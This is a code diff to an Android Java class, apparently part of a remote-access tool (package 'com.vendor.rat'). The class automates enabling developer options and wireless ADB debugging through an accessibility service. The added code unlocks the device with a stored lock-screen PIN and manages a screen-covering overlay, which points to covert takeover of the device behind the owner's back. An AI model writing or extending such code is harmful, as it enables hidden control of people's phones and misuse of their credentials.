@@ -14,6 +14,9 @@ import com.vendor.rat.auto.util.GkdSelectorHelper;
 import com.vendor.rat.service.EngineManager;
 import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.SecureSettingsWriter;
+import com.vendor.rat.helper.BlockViewHelper;
+import com.vendor.rat.credential.LockCredentialStore;
+import com.vendor.rat.utils.DeviceUtils;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -101,9 +104,14 @@ public class WirelessPairEngine extends AutoEngine {
      */
     public static boolean startPairing(Context context) {
         if (context == null) {
-            Log.w(TAG, "startPairing: context is null");
-            return false;
-        }
+     Log.w(TAG, "startPairing: context is null");
+     return false;
+     }
+        // TODO: 恢复 ADB 自动化授权时取消注释
+        // if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+        //     Log.w(TAG, "startPairing: OPPO credential gate not verified");
+        //     return false;
+        // }
         if (!mPairingInProgress.compareAndSet(false, true)) {
             Log.w(TAG, "startPairing: already in progress");
             return false;
@@ -215,6 +223,13 @@ public class WirelessPairEngine extends AutoEngine {
                 break;
             case FAILED:
                 logError("Pairing failed");
+                // Phase 0 PIN 错误时：清除 PIN + 关闭遮罩，让用户重新输入
+                if (LockCredentialStore.hasCredential() && !SecureSettingsWriter.isDeveloperOptionsEnabled(getContext())) {
+                    Log.d(TAG, "Phase 0 failed with stored PIN — clearing PIN for re-entry");
+                    LockCredentialStore.clearAll();
+                    LockCredentialStore.resetCurrentRunFlags();
+                }
+                BlockViewHelper.removeViewInternal();
                 finish();
                 break;
             default:
@@ -233,6 +248,13 @@ public class WirelessPairEngine extends AutoEngine {
         if (SecureSettingsWriter.isDeveloperOptionsEnabled(getContext())) {
             log("Phase 0: 开发者选项已启用，跳过");
             transitionTo(PairState.NAVIGATE_DEV_OPTIONS);
+            return;
+        }
+
+        // Fast fail: dev options disabled and no stored PIN — cannot auto-unlock
+        if (!LockCredentialStore.hasCredential()) {
+            logError("Phase 0: dev options disabled and no stored PIN, fast fail");
+       transitionTo(PairState.FAILED);
             return;
         }
 
@@ -358,6 +380,11 @@ public class WirelessPairEngine extends AutoEngine {
      *   3. If OFF: click switch_layout to toggle ON, handle confirm dialog, then click main_layout
      */
     private void handleEnableWirelessDebug() {
+        if (SecureSettingsWriter.isWifiDebugEnabled(getContext())) {
+            log("Phase 2: 无线调试已通过 API 检测开启，跳过 toggle，进入子页面");
+         enterWirelessDebugSubPage();
+      return;
+  }
         sleep(500);
         activateRoot();
         UiNode root = k();
